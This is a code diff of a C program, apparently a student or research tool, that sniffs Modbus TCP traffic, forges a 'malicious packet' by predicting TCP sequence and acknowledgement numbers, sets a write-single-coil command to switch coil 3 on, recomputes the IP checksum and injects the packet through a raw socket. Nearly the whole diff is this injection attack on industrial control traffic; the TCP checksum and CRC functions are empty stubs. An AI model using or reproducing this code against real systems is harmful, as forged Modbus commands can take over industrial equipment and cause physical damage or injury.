@@ -7,9 +7,10 @@
 
 
 int main(void){
+
   // Modbus TCP packet
   modbusPacket * mPacket;
-  char packetRawForm[PACKET_SIZE];
+  char * packetRawForm;
   // raw sockete for sending packets
   int rawSocket;  
   pcap_t * sniffInterface = NULL;
@@ -33,20 +34,23 @@ int main(void){
     // generate malicious packet (predict seq, ack nums) from existing 
     generateMaliciousPacket(mPacket);
 
-    // prepare packet to send
-    packetToCharArray(packetRawForm, mPacket);
-
     int packet_size = ETH_HEADER_SIZE + IP_HEADER_SIZE
-    + TCP_HEADER_SIZE + MODBUS_HEADER_SIZE + ntohs(mPacket->modbusH.lenght) -1;
+    + TCP_HEADER_SIZE + MODBUS_HEADER_SIZE + (ntohs(mPacket->modbusH.lenght) -1);
+    
+    // prepare packet to send
+    packetRawForm = packetToCharArray(packet_size, mPacket);
 
+    printf("len: %d\n",packet_size);
     //// debug packet raw data 
-    for (int i = 0; i < packet_size; i++)
+    for (int i = 0; i < packet_size; i++){
       printf(" %02hhX", packetRawForm[i]);
+    }
     printf("\n");
 
     // send the data over the raw socket
     write(rawSocket, packetRawForm, packet_size);
     printf(".");
+    free(packetRawForm);
     free(mPacket->modbusP.data);
     free(mPacket);
   }
@@ -55,9 +59,6 @@ int main(void){
   pcap_close(sniffInterface);
   return 0;
 
-//error3:
-  //fprintf(stderr, "ERROR send() %d Sending data failed \n", ret);
-  //return 2;
 }
 
 /**
@@ -69,51 +70,72 @@ void generateMaliciousPacket(modbusPacket *mPacket){
   // activate -> data -> FF  
   // ack = ack + 48 == 4 write_single_coil packets
   // seq = seq + 48 == 4 write_single_coil packets
-
-
-  mPacket->ipHeader.id = random();
-
-  mPacket->ipHeader.check = 0;
-
-  uint32_t sum = 0;
-  uint16_t *ptr = (uint16_t*)&mPacket->ipHeader;
-  for (int i = 0; i < sizeof(struct iphdr)/2; i++) {
-      sum += ntohs(*(ptr+i));
-  }
-
-  // Add in the pseudo-header fields
-  sum += ntohs(mPacket->ipHeader.protocol);
-  sum += ntohs(mPacket->ipHeader.tot_len);
-  sum += ntohs(mPacket->ipHeader.saddr>>16);
-  sum += ntohs(mPacket->ipHeader.saddr & 0xffff);
-  sum += ntohs(mPacket->ipHeader.daddr>>16);
-  sum += ntohs(mPacket->ipHeader.daddr & 0xffff);
-
-  // Fold the carries into the sum
-  while (sum >> 16) {
-      sum = (sum & 0xFFFF) + (sum >> 16);
-  }
-
-  // Take the one's complement of the result and store it in the checksum field
-  mPacket->ipHeader.check = htons(~sum);
-
-
-
-  mPacket->tcpHeader.seq = htonl(ntohl(mPacket->tcpHeader.seq) + 48);
-  mPacket->tcpHeader.ack_seq = htonl(ntohl(mPacket->tcpHeader.ack_seq) + 48);
-
+  
   // transaction id has to be unique 
   mPacket->modbusH.transactionId += rand();
 
   // ref num 3
   mPacket->modbusP.data[0] = 0;
-  mPacket->modbusP.data[1] = rand() % 4;
+  mPacket->modbusP.data[1] = 3;
+  //mPacket->modbusP.data[1] = rand() % 4;
 
   // activate data
-  if (rand() % 2 == 0)
-    mPacket->modbusP.data[2] = 0xff;
-  else
-    mPacket->modbusP.data[2] = 0x00;
+  mPacket->modbusP.data[2] = 0xff;
+  //if (rand() % 2 == 0)
+    //mPacket->modbusP.data[2] = 0xff;
+  //else
+    //mPacket->modbusP.data[2] = 0x00;
+
+
+  mPacket->ipHeader.id = random();
+  countIpChecksum(mPacket);
+  //mPacket->ipHeader.check = 0;
+
+  mPacket->tcpHeader.seq = htonl(ntohl(mPacket->tcpHeader.seq) + 48);
+  mPacket->tcpHeader.ack_seq = htonl(ntohl(mPacket->tcpHeader.ack_seq) + 48);
+
+}
+
+/**
+ * @brief count ip checksum for given packet 
+ */
+void countIpChecksum(modbusPacket * mPacket){
+  
+  // checksum field is nout counted 
+  mPacket->ipHeader.check = 0; 
+
+  uint32_t result = 0; 
+
+  // inicialization of 16 bit value to ipHeader begining   
+  const uint16_t *buf = (const uint16_t *) &mPacket->ipHeader;
+  // iterate throught ip header (+16bit one iteration)
+  for (int i = 0; i < IP_HEADER_SIZE/2; i++) { 
+    result += buf[i];
+  }
+    
+  // Add carry bits to sum
+  // while there are some positive bits in upper 16bits 
+  // sum the upper part to the lower part 
+  while (result >> 16) {
+    result = (result & 0xFFFF) + (result >> 16);
+  }
+
+  // complement == negate all bits 
+  mPacket->ipHeader.check = (uint16_t) ~result;
+}
+
+/**
+ * @brief count tcp checksum for given packet 
+ */
+void countTcpChecksum(modbusPacket * mPacket){
+  return;
+}
+
+/**
+ * @brief count CRC checksum for given frame 
+ */
+uint32_t countCRC(modbusPacket * mPacket){
+  return 0;
 }
 
 /**
